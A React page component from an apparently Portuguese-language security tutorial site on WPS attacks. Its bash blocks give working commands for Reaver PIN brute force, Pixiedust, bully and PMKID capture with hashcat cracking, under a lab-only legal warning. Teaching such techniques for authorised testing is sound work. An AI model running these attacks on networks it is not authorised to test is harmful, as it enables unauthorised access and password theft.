import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function Reaver() {
    return (
      <PageContainer
        title="Reaver & Ataques WPS"
        subtitle="Explore vulnerabilidades do protocolo WPS para recuperar senhas WPA/WPA2 sem precisar quebrá-las."
        difficulty="avancado"
        timeToRead="10 min"
      >
        <AlertBox type="danger" title="Uso exclusivo em redes próprias ou com autorização">
          Atacar redes WiFi sem autorização é crime sob a Lei 12.737/2012 no Brasil.
          Use apenas em ambiente de lab com roteador próprio.
        </AlertBox>

        <h2>O que é WPS?</h2>
        <p>
          WPS (WiFi Protected Setup) é um protocolo para facilitar a conexão de dispositivos à rede.
          O PIN de 8 dígitos do WPS é vulnerável a ataques de força bruta — o protocolo verifica
          os 4 primeiros dígitos separados dos outros, reduzindo de 100 milhões para apenas 11.000 tentativas!
        </p>

        <h2>Verificar Redes com WPS Ativo</h2>
        <CodeBlock language="bash" code={'# Colocar interface em modo monitor\nsudo airmon-ng start wlan0\n\n# Verificar redes com WPS\nsudo wash -i wlan0mon\n# Ou:\nsudo airodump-ng wlan0mon\n\n# Colunas relevantes do wash:\n# BSSID   - MAC do AP\n# WPS     - versão do WPS\n# Lck     - WPS Locked? (bloqueado após tentativas)\n# ESSID   - nome da rede'} />

        <h2>Reaver — Ataque WPS PIN</h2>
        <CodeBlock language="bash" code={'# Instalar\nsudo apt install reaver -y\n\n# Ataque básico\nsudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv\n\n# Opções importantes:\n# -d: delay entre tentativas (segundos, padrão 1)\n# -t: timeout por tentativa\n# -p: especificar PIN inicial\n# --no-nacks: não enviar NACKs (bypass em alguns APs)\n\n# Com delay para evitar lockout\nsudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -t 10 -vv\n\n# Retomar sessão interrompida\nsudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv --session arquivo.wps'} />

        <h2>Pixiedust Attack — WPS Offline</h2>
        <CodeBlock language="bash" code={'# Pixiedust é muito mais rápido que brute force\n# Explora falha na geração de nonces aleatórios\n\n# Instalar pixiewps\nsudo apt install pixiewps -y\n\n# Reaver com pixiedust\nsudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv\n\n# Com bully (alternativa ao reaver)\nsudo apt install bully -y\nsudo bully -b AA:BB:CC:DD:EE:FF -d -v 3 wlan0mon'} />

        <h2>WPA PMKID Attack (Sem Clientes Conectados)</h2>
        <CodeBlock language="bash" code={'# Moderno e eficiente — não precisa capturar handshake!\n\n# Instalar hcxdumptool\nsudo apt install hcxdumptool hcxtools -y\n\n# Capturar PMKID\nsudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1\n\n# Converter para formato hashcat\nhcxpcapngtool -o pmkid.hash pmkid.pcapng\n\n# Quebrar com hashcat\nhashcat -m 22000 pmkid.hash /usr/share/wordlists/rockyou.txt'} />

        <AlertBox type="warning" title="WPS está sendo removido">
          Roteadores modernos têm WPS desabilitado por padrão ou com proteção contra lockout.
          Em redes modernas, prefira captura de handshake WPA2 + hashcat, ou PMKID attack.
        </AlertBox>
      </PageContainer>
    );
  }
  